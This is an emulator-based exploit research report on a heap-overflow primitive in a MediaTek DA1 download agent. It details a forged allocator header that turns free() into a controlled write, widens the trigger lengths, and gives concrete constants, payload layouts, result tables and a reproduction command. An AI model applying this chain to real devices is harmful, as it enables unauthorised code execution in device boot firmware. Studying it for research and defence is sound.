# DA1 200EX01 — length desync vs the HeapBait exact fit

**Date:** 2026-10-25  
**Target:** `docs/notes/rmx3630-da2/da1_allinone.bin` (DA1 200EX01, `sha256 e1a4110a…`)  
**Harness:** Unicorn 2.1.4 + capstone 5.0.7, `/tmp/opencode/da1venv/bin/python`  
**Device access:** none. All evidence is emulator evidence; silicon is untested.  
**New files:** `docs/notes/da1_desync_chain.py`, this report.  
**Reused unmodified:** `da1_fixed_stage.py`, `da1_fuzz.py`, `da1_geometry_study.py`,
`da1_heap_sweep.py`, `da1_emu.py`. No git commit.

---

## 0. TL;DR — honest bottom line

**The desync does not remove the exact-fit dependency on the 0x4C scratch hole.
It removes the “declared length must be exactly 0x3C” equality.**

| question | answer |
|---|---|
| Can L > 0x3C (needed > 0x4C) fire `dpc->cb = 0x40000000` by repairing the remainder/tree headers? | **No.** All 19 configurations × 5 runs: 0 fire. Best case ALIVE (repaired free list), otherwise CRASH at the allocator or mxmlDelete. |
| Can L < 0x3C (needed < 0x4C, hole split) fire by repairing the split remainder? | **Yes.** 11 distinct declared lengths `0x4 … 0x38` fire 5/5 each; the split remainder is repaired with the free-list sentinel `0x2DF7D8`. |
| Does the widened trigger need a runtime heap address? | **No.** The payload contains only the globals `0x2DF79C` (dpc fake node), `0x2DF7D8` (sentinel), `0x40000000` (the fire value) and relative offsets. Heap base `0x2E8000` is a compile-time constant and the geometry is prelude-independent (10/10 re-verified). It is build-specific, not ASLR-dependent. |
| Control | The committed exact-fit `L = 0x3C` `make_payload` fires 5/5 (`cb = 0x40000000`, handler `rc = 0xC0010001`). |

So: **the exact-fit *length* requirement is beaten (widened from one value to
every `L ≤ 0x3C`), but the exact-fit *hole* requirement is not.** The download
must still be satisfied by `load_str`’s freed 0x4C scratch chunk below the XML
tree. `L ≥ 0x40` always allocates above every live tree chunk, where no
`free()` will ever see the fake header.

---

## 1. Why exact-fit existed, and what the desync changes

### 1.1 The download loop (0x2500D8)

```
0x250380  recv(&stack_scratch, &packet_len)   ; expect "OK" chunk ack
0x2503dc  send("OK", 3)
0x2503f4  len = packet_len
0x250400  recv(D + r7, &len)                  ; D = malloc(L+4), r7 = accumulated
0x25041c  r6 = len
0x250424  r7 += r6
0x250428  cmp r7, sb (declared)               ; exits only on EXACT equality
0x25042c  bne 0x250380                        ; otherwise another D+r7 write
```

The destination is `D + r7`; `r6` is only bounded by `packet_len` (0x2000),
never by `declared - r7`. An oversized chunk appends at `D + r7`, full content
control. On the success exit (`r7 == declared`) the handler frees `D`; on the
error exit (`r7 > declared`, recv timeout) it does **not** free `D`; both paths
then call `mxmlDelete(tree)`.

### 1.2 The allocator

`malloc` (0x2041E8): `needed = align4(req + 0xC) + align` (align 0 for the
download). First-fit from `[HEAP_HEAD+0xC]` (smallest) through `node+4`
(next). A node is split **from its low end**:

```
0x204294  remainder = node + needed
0x2042a0  remainder.size = node.size - needed
0x2042a4  node.size = needed
```

with no split when `node.size <= needed + 0xC` (the whole node is returned).
Allocated header: `{0x68656170, self, size}`. Free-list node: `{prev, next,
size}`, sentinel at `HEAP_HEAD+8`.

`free` wrapper (0x204380) ends with the fire write:

```
0x2043c8  ldmdb r4, {r0, r1}     ; r0 = [user-8] = node.next, r1 = [user-4] = size
0x2043cc  str   r1, [r0, #8]     ; writes size into node.next->size
```

For a real allocated header `node.next == self`, so this is a no-op. With the
forged header `{0xDEADBEEF, 0x2DF79C, 0x40000000}` placed on a chunk header,
`free(chunk_user)` writes `0x40000000` to `0x2DF79C+8 = 0x2DF7A4 = dpc->cb`.
`insert` (0x2043D8) then runs; the fire has already happened.

`mxmlDelete` (0x208758) frees the XML tree bottom-up and frees the root last.
The 0x20872C abort is inside its node unlink (`strne r3,[r2,#4]`), not in the
allocator: it means an mxml node’s *data* was clobbered, not just a header.

### 1.3 Why L = 0x3C

`load_str` holds `malloc(0x40)` (chunk 0x4C) for the whole parse, allocates the
tree above it, and frees the scratch last. `malloc(L+4)` with
`align4(L+0x10) = 0x4C` reuses that hole exactly, so the download buffer `D`
is *below* the tree, and the overflow crosses into the first tree chunk header.
The committed geometry study proved this hole is present for 10/10 device
preludes.

**Key structural fact for everything below:** within one command the XML tree
is allocated **before** the download. The allocator splits a free node from its
low end. Therefore any node chosen for the download leaves the remainder
**above** the allocation, and all tree chunks allocated earlier are **below**
the download buffer — unless the download reuses a hole that was freed *after*
the tree (the load_str scratch hole). That is exactly the 0x4C hole.

---

## 2. Case 2 — L < 0x3C, hole split: repair works (positive)

For `needed < 0x40` the 0x4C hole is split; a free remainder node is inserted
at `D + needed - 0xC`, between the buffer and the first tree chunk. The
overflow overwrites it. If it is left as zeros, the very first insert walk
dereferences `next = 0` and aborts at **0x204400, fault 0x4**. Repairing it as

```
{ prev = SENTINEL, next = SENTINEL, size = 0x4C - needed }
```

makes the walk terminate at the sentinel and every later insert append through
valid sentinel links. The fake triple is then placed at the hole’s **true user
capacity**, offset `0x40` (`0x4C - 0xC`) from `D` — not at the
`needed - 0xC` offset that the committed `make_payload` uses. That offset is
the header of the first live XML-tree chunk, and `mxmlDelete` frees it last:
the fire is reached exactly as in the exact-fit case.

Measured (5 fresh-emulator runs each):

| declared L | needed | split? | repair | result |
|---:|---:|:---:|:---:|---|
| 0x3C (control) | 0x4C | no | n/a | FIRE 5/5 `cb=0x40000000` |
| 0x38 | 0x48 | no | n/a | FIRE 5/5 |
| 0x34 | 0x44 | no | n/a | FIRE 5/5 |
| 0x30 | 0x40 | no | n/a | FIRE 5/5 |
| 0x2C | 0x3C | yes | yes | FIRE 5/5 |
| 0x28 | 0x38 | yes | yes | FIRE 5/5 |
| 0x20 | 0x30 | yes | yes | FIRE 5/5 |
| 0x18 | 0x28 | yes | yes | FIRE 5/5 |
| 0x10 | 0x20 | yes | yes | FIRE 5/5 |
| 0x0C | 0x1C | yes | yes | FIRE 5/5 |
| 0x08 | 0x18 | yes | yes | FIRE 5/5 |
| 0x04 | 0x14 | yes | yes | FIRE 5/5 |

Why 0x34/0x38 also work without repair: when `needed > 0x40`, the remainder
would be `≤ 0xC`, so `malloc` does **not** split and returns the whole 0x4C
node. The next chunk is still the tree header, so the true capacity is 0x40.
That is a second way the declared equality was unnecessary: any `needed` in
`(0x40, 0x4C]` gets the whole hole.

Negative controls (same 5-run protocol):

* **no repair** at L=0x10/0x20 → CRASH 5/5 at **0x204400 @ 0x4**;
* **make_payload placement** (fake at `needed-0xC`) at L=0x10/0x20 →
  CRASH 5/5 at **0x204400 @ 0x4**; at L=0x30 → ALIVE (`rc=0xC0010001`), no
  fire (the fake sits inside the buffer, never freed).

So the repair and the move to the true chunk capacity are both necessary.

---

## 3. Case 1 — L > 0x3C (needed > 0x4C): no fire is reachable

`needed > 0x4C` cannot use the scratch hole. First-fit therefore returns a
fresh node — the top tail in the bare path, a prelude hole in some preludes.
The tree was allocated earlier, so **every current-command tree chunk is below
D**. The upward overflow only reaches free space: the split remainder and the
tail. `mxmlDelete` frees tree chunks *below* D, whose headers were never
touched; `free()` never sees a fake header.

Layout probe at the download `malloc` entry (direct-handler mode):

| L | needed | D | node size | hole reused | split | remainder ends | tree chunks above D | allocs above D | first allocated chunk above remainder |
|---:|---:|---:|---:|:---:|:---:|---:|---:|---:|---:|
| 0x10 | 0x20 | 0x2e9198 | 0x4C | yes | yes | 0x2e91d8 | **26** | 27 | 0x2e91e4 (tree) |
| 0x30 | 0x40 | 0x2e9198 | 0x4C | yes | no | — | **26** | 27 | — |
| 0x3C | 0x4C | 0x2e9198 | 0x4C | yes | no | — | **26** | 27 | — |
| 0x40 | 0x50 | 0x2e9830 | 0xE7DC | no | yes | 0x2F8000 | **0** | 0 | — (heap end) |
| 0x100 | 0x110 | 0x2e9830 | 0xE7DC | no | yes | 0x2F8000 | **0** | 0 | — (heap end) |

The same count across the ten committed preludes (reusing
`da1_geometry_study.run_case/VARIANTS`):

```
L=0x20: tree_chunks_above_D = 26, 52, 52, 52, 52, 52, 52, 52, 52, 52   (P0..P9)
L=0x40: tree_chunks_above_D =  0,  0,  0,  0,  0,  0,  0,  0,  0,  0
L=0x100: tree_chunks_above_D = 0,  0,  0,  0,  0,  0,  0,  0,  0,  0
```

`P1/P3/P6/P7` have a middle hole, so `D` is not the top of the heap, but the
current-command tree is still below it. A live prelude leftover can sit above
the remainder (e.g. the 0x200 buffer at `0x2EA6D8` in P1), but it is not an
mxml node of this command and `mxmlDelete` never frees it.

Configurations measured (4 declared lengths × 4 payload strategies, plus
multi-round; 5 runs each):

| L | strategy | result |
|---:|---|---|
| 0x40/0x50/0x100/0x400 | repair remainder only (`{SENT,SENT,size}`) | ALIVE 5/5 `rc=0xC0010001`, free list walkable |
| 0x40/0x50/0x100/0x400 | fake triple on remainder header | CRASH 5/5 **0x204430 @ 0xDEADBEF3** (`str r0,[r3,#4]`, the corrupted remainder `prev`) |
| 0x40/0x50/0x100/0x400 | repair + fake triple above remainder | ALIVE 5/5, no fire |
| 0x40/0x50/0x100 | probe-style 0x200 chunk | CRASH 5/5 **0x204430 @ 0xDEADBEF3** |
| 0x400 | 0x200 chunk (shorter than `needed`) | ALIVE 5/5 |
| 0x40/0x50/0x100 | multi-round (11-byte slices), repaired | ALIVE 5/5, free list walkable |

The 0x20872C abort from the campaign is **not** reached for `L > 0x3C`: it
requires the overflow to clobber an mxml node’s data above `D`, which only
happens when the buffer is below the tree (`L ≤ 0x3C`). Reproduced there:

| L | chunk | result |
|---:|---:|---|
| 0x3C | 0x50 (4-byte overshoot) | FIRE 5/5 (`cb=0x40000000`; campaign F5) |
| 0x3C | 0x60 | CRASH 5/5 **0x20872C @ 0x41414145** |
| 0x3C | 0x100 | CRASH 5/5 **0x20872C @ 0x41414145** |
| 0x3C | 0x200 | CRASH 5/5 **0x20872C @ 0x41414145** |

So for `L > 0x3C` repairing the free list converts the crash into a clean ALIVE
handler error, but cannot create a fire: the fake-headed chunk is never passed
to `free()`.

---

## 4. Case 3 — multi-round delivery, chosen stop offsets

The recv loop treats each data frame as independent, so the payload can be
delivered over several rounds with an `OK` ack between slices. The critical
constraint: **a slice boundary whose prefix sum equals `declared` exits the
loop successfully before the rest is delivered.** Measured with 0x10-byte
slices at L=0x40/0x100 (4 or 16 rounds land exactly on declared):
ALIVE 5/5, `rc=0`, `cb=0` — no overflow at all.

With 11-byte slices (`0xB`), no prefix sum hits any of the tested declared
lengths (11·k never equals 4, 8, 0xC, 0x10, 0x18, 0x20, 0x28, 0x2C, 0x30,
0x34, 0x38, 0x40, 0x50, 0x100), so the repaired payload reaches the end:

* `L = 0x10/0x20/0x30` (hole path, remainder repaired): **FIRE 5/5**;
* `L = 0x40/0x50/0x100` (above-tree path, remainder repaired): ALIVE 5/5,
  free list walkable, no fire.

This confirms that the negative result for `L > 0x3C` is not an artifact of
single-chunk delivery, and that a fully reconstructed (sentinel-terminated)
free list is achievable with constants only.

---

## 5. Determinism and address-dependence

* Every configuration was run **5 times on a fresh emulator**; all 45
  configs produced byte-identical `(verdict, cb, fault_pc, fault_addr, rc)`
  tuples. The full table is in §7.
* The firing payloads contain **no heap pointer and no image pointer**. The
  address scan (heap window at every byte offset, image window at aligned
  words) reports `addr-free = yes` for all 16 firing configs.
  Constants used: `0x2DF79C` (forged dpc node), `0x2DF7D8` (free-list
  sentinel), `0xDEADBEEF`, `0x40000000`, sizes, and the relative offsets
  `0x40` / `needed-0xC`.
* `heap_init` hard-codes base `0x2E8000`, size `0x10000`; there is no heap
  ASLR in this build. The 0x4C hole is prelude-independent per the committed
  geometry study and re-checked across all ten preludes here.
* Therefore the widened trigger is **layout-deterministic** and needs **no
  runtime address**. It is **not build-independent**: the 0x4C hole / 0x40
  capacity and the `L+4 → align4(L+0x10)` rounding are 200EX01 constants and
  must be re-measured for the 420EX01 build on the phone.
  (Update 2026-10-26: the 420EX01 DA1's static constants are now resolved — all
  identical to 200EX01, see `re-da1-420audit-2026-10-26.md` §6 — so only the
  runtime heap desync itself remains to be measured on silicon.)

---

## 6. What this does and does not buy an attacker

* It is still the **same primitive** as the known HeapBait: an allocator-header
  forgery that turns `free()` into a controlled write to `dpc->cb`
  (`0x2DF7A4`). It is not a new write-what-where.
* It **widens the trigger**: instead of requiring `L = 0x3C`, any declared
  length `L ≤ 0x3C` works, including the original 0x3C and values as small as
  0x4. It also works over multiple recv rounds.
* It **does not** widen the victim class: the download must still reuse the
  post-tree scratch hole (0x4C). With `needed > 0x4C` the buffer is above the
  tree and there is no live header above it to forge.
* Post-fire behaviour is unchanged: the free list is left corrupted
  (`fl_ok = False`) and the handler returns `0xC0010001`; the campaign’s
  stub-repair note applies.
* Because the FF `cb` target `0x40000000` is the real BOOT-TO staging window,
  the practical chain target is the existing one; this work changes gating,
  not the payload.

**Verdict:** the desync removes the exact-fit *declared-length* dependency,
not the exact-fit *heap-hole* dependency. Honest one-liner: *“L must still fit
the 0x4C scratch hole; only the equality to 0x3C was an accident.”*

---

## 7. Reproduction

```bash
cd /root/mtkclient
/tmp/opencode/da1venv/bin/python docs/notes/da1_desync_chain.py \
    --image docs/notes/rmx3630-da2/da1_allinone.bin \
    --json /tmp/opencode/da1_desync_chain.json
echo $?          # 0
```

Measured run: 45 configs × 5 runs + layout probes + 30 prelude rows, ~7 s,
exit 0.

### 7.1 PASS/FAIL block (verbatim)

```
PASS control-exact-fit                  5/5 FIRE FIRE:40000000
PASS relax-window-fire                  14 configs x 5 runs all FIRE cb=0x40000000
PASS repair-and-placement-matter        5 negative controls: 0 fire
PASS no-fire-above-0x4c                 19 configs x 5 runs: 0 fire (CRASH or ALIVE only)
PASS history-long-chunk                 L=0x3C: 0x50 fires, 0x60/0x100/0x200 abort at 0x20872C (mxmlDelete) with cb untouched
PASS early-exit-at-declared             EARLY piece=declared L=0x40: ALIVE:00000000; EARLY piece=declared L=0x100: ALIVE:00000000
PASS deterministic-runs                 all 45 configs identical across 5 fresh-emulator runs
PASS no-hang-or-harness-error           0 HANG / 0 ERROR
PASS fire-payloads-address-free         16 firing configs use constants only (fp=0x2DF79C, sentinel=0x2DF7D8, cb=0x40000000, offsets)
PASS layout-tree-side                   L<=0x3C: tree above D; L>0x3C: 0 tree chunks above D (L=0x10:26, L=0x30:26, L=0x3c:26, L=0x40:0, L=0x100:0)
PASS layout-prelude-independent         30 prelude rows: L<=0x3C fire-capable, L>0x3C has 0 current tree chunks above D
```

### 7.2 Determinism table (config × runs, verbatim)

```
 #  config                              L mode       runs  per-run outcome                          det  fire addr-free
 1  CONTROL exact-fit              0x003c single        5  FIRE:40000000 x5                         yes  5/5        yes
 2  RELAX repair L=0x4             0x0004 single        5  FIRE:40000000 x5                         yes  5/5        yes
 3  RELAX repair L=0x8             0x0008 single        5  FIRE:40000000 x5                         yes  5/5        yes
 4  RELAX repair L=0xc             0x000c single        5  FIRE:40000000 x5                         yes  5/5        yes
 5  RELAX repair L=0x10            0x0010 single        5  FIRE:40000000 x5                         yes  5/5        yes
 6  RELAX repair L=0x18            0x0018 single        5  FIRE:40000000 x5                         yes  5/5        yes
 7  RELAX repair L=0x20            0x0020 single        5  FIRE:40000000 x5                         yes  5/5        yes
 8  RELAX repair L=0x28            0x0028 single        5  FIRE:40000000 x5                         yes  5/5        yes
 9  RELAX repair L=0x2c            0x002c single        5  FIRE:40000000 x5                         yes  5/5        yes
10  RELAX repair L=0x30            0x0030 single        5  FIRE:40000000 x5                         yes  5/5        yes
11  RELAX repair L=0x34            0x0034 single        5  FIRE:40000000 x5                         yes  5/5        yes
12  RELAX repair L=0x38            0x0038 single        5  FIRE:40000000 x5                         yes  5/5        yes
13  NEG no-repair L=0x10           0x0010 single        5  CRASH:204400@00000004 x5                 yes  0/5        yes
14  NEG no-repair L=0x20           0x0020 single        5  CRASH:204400@00000004 x5                 yes  0/5        yes
15  NEG capacity L=0x10            0x0010 single        5  CRASH:204400@00000004 x5                 yes  0/5        yes
16  NEG capacity L=0x20            0x0020 single        5  CRASH:204400@00000004 x5                 yes  0/5        yes
17  NEG capacity L=0x30            0x0030 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
18  C1 repair L=0x40               0x0040 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
19  C1 fake-on-remainder L=0x40    0x0040 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
20  C1 repair+fake-above L=0x40    0x0040 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
21  C1 long-0x200 L=0x40           0x0040 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
22  C1 repair L=0x50               0x0050 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
23  C1 fake-on-remainder L=0x50    0x0050 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
24  C1 repair+fake-above L=0x50    0x0050 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
25  C1 long-0x200 L=0x50           0x0050 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
26  C1 repair L=0x100              0x0100 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
27  C1 fake-on-remainder L=0x100   0x0100 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
28  C1 repair+fake-above L=0x100   0x0100 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
29  C1 long-0x200 L=0x100          0x0100 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
30  C1 repair L=0x400              0x0400 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
31  C1 fake-on-remainder L=0x400   0x0400 single        5  CRASH:204430@deadbef3 x5                 yes  0/5        yes
32  C1 repair+fake-above L=0x400   0x0400 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
33  C1 long-0x200 L=0x400          0x0400 single        5  ALIVE:c0010001 x5                        yes  0/5        yes
34  C3 repair multi L=0x40         0x0040 piece=0xb     5  ALIVE:c0010001 x5                        yes  0/5        yes
35  C3 repair multi L=0x50         0x0050 piece=0xb     5  ALIVE:c0010001 x5                        yes  0/5        yes
36  C3 repair multi L=0x100        0x0100 piece=0xb     5  ALIVE:c0010001 x5                        yes  0/5        yes
37  MULTI repair L=0x10            0x0010 piece=0xb     5  FIRE:40000000 x5                         yes  5/5        yes
38  MULTI repair L=0x20            0x0020 piece=0xb     5  FIRE:40000000 x5                         yes  5/5        yes
39  MULTI repair L=0x30            0x0030 piece=0xb     5  FIRE:40000000 x5                         yes  5/5        yes
40  HIST long 0x50 L=0x3c          0x003c single        5  FIRE:40000000 x5                         yes  5/5        yes
41  HIST long 0x60 L=0x3c          0x003c single        5  CRASH:20872c@41414145 x5                 yes  0/5        yes
42  HIST long 0x100 L=0x3c         0x003c single        5  CRASH:20872c@41414145 x5                 yes  0/5        yes
43  HIST long 0x200 L=0x3c         0x003c single        5  CRASH:20872c@41414145 x5                 yes  0/5        yes
44  EARLY piece=declared L=0x40    0x0040 piece=0x10    5  ALIVE:00000000 x5                        yes  0/5        yes
45  EARLY piece=declared L=0x100   0x0100 piece=0x10    5  ALIVE:00000000 x5                        yes  0/5        yes
```

`FIRE:cb` = `dpc->cb`; `CRASH:pc@fault` = stop PC and faulting address;
`ALIVE:rc` = handler return.

---

## 8. Limitations / honesty

* Emulator only. No silicon run; the 420EX01 build on the phone has different
  constants and must be re-measured (same structural recipe).
* The layout argument is proved for this command path and measured across the
  ten committed preludes. It is not an exhaustive search over arbitrary
  multi-command heap shaping. The structural reason it should generalise
  within this path: `mxmlDelete` only frees the *current* command’s tree, and
  that tree is allocated before the download; first-fit + low-end splitting
  puts the later download at or above the remainder of any shared free node.
* A prelude can leave a live non-tree chunk above the download (P1’s 0x200
  buffer). It is never freed by this handler, so it cannot fire; it could
  matter for a different primitive (e.g. a later command reusing that buffer),
  which was not explored here.
* `L = 0` was not tested (the zero-declared branch at 0x250360 is a separate
  path); the measured firing window is `0x4 … 0x3C`.
* The free list is left corrupt after every fire (`fl_ok = False`), exactly as
  the known primitive; this work does not add a clean-free-list variant.
